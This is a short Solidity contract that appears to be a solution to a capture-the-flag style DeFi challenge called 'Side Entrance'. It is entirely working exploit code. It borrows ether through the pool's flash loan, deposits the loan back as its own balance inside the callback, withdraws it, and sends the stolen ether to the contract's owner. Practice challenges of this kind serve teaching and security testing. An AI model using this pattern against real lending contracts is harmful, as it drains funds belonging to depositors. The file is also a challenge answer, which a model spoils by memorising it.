// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceAttack {
    SideEntranceLenderPool immutable pool;
    address immutable owner;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
        owner = msg.sender;
    }

    function attack(uint amount) external {
        pool.flashLoan(amount);
        pool.withdraw();
    }

    function execute() external payable {
        pool.deposit{value: address(this).balance}();
    }

    receive() external payable {
        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success, "transfer failed");
    }
}
